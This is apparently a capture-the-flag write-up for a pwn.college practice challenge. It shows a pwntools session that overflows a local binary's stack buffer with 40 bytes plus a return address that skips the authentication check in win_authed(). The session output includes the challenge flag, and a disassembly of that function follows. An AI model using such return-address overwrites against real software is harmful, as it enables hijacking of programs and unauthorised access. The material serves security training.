# Tricky hijack control
in this we need to crack another safe layer win auth to get the flag

## Flag
pwn.college{Ap6IRUTUEIzCIZWZYGgINOxxepM.0VO5IDL5gDN1czW}

## Solve
``` bash
Python 3.12.11 (main, Jun  3 2025, 15:41:47) [GCC 14.2.1 20250322]
Type 'copyright', 'credits' or 'license' for more information
IPython 9.2.0 -- An enhanced Interactive Python. Type '?' for help.
Tip: The `%timeit` magic has a `-o` flag, which returns the results, making it easy to plot. See `%timeit?`.

In [1]: from pwn import *

In [2]: p=process('./binary-exploitation-control-hijack-2-w')
[x] Starting local process './binary-exploitation-control-hijack-2-w'
[+] Starting local process './binary-exploitation-control-hijack-2-w': pid 231

In [3]: payload = b"A" * 40 + (0x401c70).to_bytes(8, 'little')

In [4]: p.send(payload)

In [5]: p.readall()
[x] Receiving all data
[x] Receiving all data: 0B
[*] Process './binary-exploitation-control-hijack-2-w' stopped with exit code -7 (SIGBUS) (pid 231)
[x] Receiving all data: 4.00KB
[x] Receiving all data: 5.95KB
[+] Receiving all data: Done (5.95KB)
the address of win_authed() is 0x401c54.\n\nIf you have managed to overwrite the return address with the correct value,\nchallenge() will jump straight to win_authed() when it returns.\nLet\'s try it now!\n\nGoodbye!\nYou win! Here is your flag:\npwn.college{Ap6IRUTUEIzCIZWZYGgINOxxepM.0VO5IDL5gDN1czW}\n\n\n'
```

```bash
0000000000401c54 <win_authed>:
  401c54:	f3 0f 1e fa          	endbr64
  401c58:	55                   	push   rbp
  401c59:	48 89 e5             	mov    rbp,rsp
  401c5c:	48 83 ec 10          	sub    rsp,0x10
  401c60:	89 7d fc             	mov    DWORD PTR [rbp-0x4],edi
  401c63:	81 7d fc 37 13 00 00 	cmp    DWORD PTR [rbp-0x4],0x1337
  401c6a:	0f 85 fe 00 00 00    	jne    401d6e <win_authed+0x11a>
  401c70:	48 8d 3d 79 14 00 00 	lea    rdi,[rip+0x1479]        # 4030f0 <_IO_stdin_used+0xf0>
  401c77:	e8 84 f4 ff ff       	call   401100 <puts@plt>
  401c7c:	be 00 00 00 00       	mov    esi,0x0
  401c81:	48 8d 3d 84 14 00 00 	lea    rdi,[rip+0x1484]        # 40310c <_IO_stdin_used+0x10c>
  401c88:	b8 00 00 00 00       	mov    eax,0x0
  401c8d:	e8 ce f4 ff ff       	call   401160 <open@plt>
  401c92:	89 05 a8 43 00 00    	mov    DWORD PTR [rip+0x43a8],eax        # 406040 <flag_fd.5715>
  401c98:	8b 05 a2 43 00 00    	mov    eax,DWORD PTR [rip+0x43a2]        # 406040 <flag_fd.5715>
  401c9e:	85 c0                	test   eax,eax
  401ca0:	79 4d                	jns    401cef <win_authed+0x9b>
  401ca2:	e8 49 f4 ff ff       	call   4010f0 <__errno_location@plt>
  401ca7:	8b 00                	mov    eax,DWORD PTR [rax]
  401ca9:	89 c7                	mov    edi,eax
  401cab:	e8 d0 f4 ff ff       	call   401180 <strerror@plt>
  401cb0:	48 89 c6             	mov    rsi,rax
  401cb3:	48 8d 3d 5e 14 00 00 	lea    rdi,[rip+0x145e]        # 403118 <_IO_stdin_used+0x118>
  401cba:	b8 00 00 00 00       	mov    eax,0x0
  401cbf:	e8 5c f4 ff ff       	call   401120 <printf@plt>
  401cc4:	e8 67 f4 ff ff       	call   401130 <geteuid@plt>
  401cc9:	85 c0                	test   eax,eax
  401ccb:	74 18                	je     401ce5 <win_authed+0x91>
  401ccd:	48 8d 3d 74 14 00 00 	lea    rdi,[rip+0x1474]        # 403148 <_IO_stdin_used+0x148>
  401cd4:	e8 27 f4 ff ff       	call   401100 <puts@plt>
  401cd9:	48 8d 3d 90 14 00 00 	lea    rdi,[rip+0x1490]        # 403170 <_IO_stdin_used+0x170>
  401ce0:	e8 1b f4 ff ff       	call   401100 <puts@plt>
  401ce5:	bf ff ff ff ff       	mov    edi,0xffffffff
  401cea:	e8 81 f4 ff ff       	call   401170 <exit@plt>
  401cef:	8b 05 4b 43 00 00    	mov    eax,DWORD PTR [rip+0x434b]        # 406040 <flag_fd.5715>
  401cf5:	ba 00 01 00 00       	mov    edx,0x100
  401cfa:	48 8d 35 5f 43 00 00 	lea    rsi,[rip+0x435f]        # 406060 <flag.5714>
  401d01:	89 c7                	mov    edi,eax
  401d03:	e8 38 f4 ff ff       	call   401140 <read@plt>
  401d08:	89 05 52 44 00 00    	mov    DWORD PTR [rip+0x4452],eax        # 406160 <flag_length.5716>
  401d0e:	8b 05 4c 44 00 00    	mov    eax,DWORD PTR [rip+0x444c]        # 406160 <flag_length.5716>
  401d14:	85 c0                	test   eax,eax
  401d16:	7f 2c                	jg     401d44 <win_authed+0xf0>
  401d18:	e8 d3 f3 ff ff       	call   4010f0 <__errno_location@plt>
  401d1d:	8b 00                	mov    eax,DWORD PTR [rax]
  401d1f:	89 c7                	mov    edi,eax
  401d21:	e8 5a f4 ff ff       	call   401180 <strerror@plt>
  401d26:	48 89 c6             	mov    rsi,rax
  401d29:	48 8d 3d 98 14 00 00 	lea    rdi,[rip+0x1498]        # 4031c8 <_IO_stdin_used+0x1c8>
  401d30:	b8 00 00 00 00       	mov    eax,0x0
  401d35:	e8 e6 f3 ff ff       	call   401120 <printf@plt>
  401d3a:	bf ff ff ff ff       	mov    edi,0xffffffff
  401d3f:	e8 2c f4 ff ff       	call   401170 <exit@plt>
  401d44:	8b 05 16 44 00 00    	mov    eax,DWORD PTR [rip+0x4416]        # 406160 <flag_length.5716>
  401d4a:	48 98                	cdqe
  401d4c:	48 89 c2             	mov    rdx,rax
  401d4f:	48 8d 35 0a 43 00 00 	lea    rsi,[rip+0x430a]        # 406060 <flag.5714>
  401d56:	bf 01 00 00 00       	mov    edi,0x1
  401d5b:	e8 b0 f3 ff ff       	call   401110 <write@plt>
  401d60:	48 8d 3d 8b 14 00 00 	lea    rdi,[rip+0x148b]        # 4031f2 <_IO_stdin_used+0x1f2>
  401d67:	e8 94 f3 ff ff       	call   401100 <puts@plt>
  401d6c:	eb 01                	jmp    401d6f <win_authed+0x11b>
  401d6e:	90                   	nop
  401d6f:	c9                   	leave
  401d70:	c3                   	ret
```
in the binary file it said 40 bytes so that was the number of bytes needed to overflow win auth and we get the value of the starting offset from reading the win auth and getting to know the offset
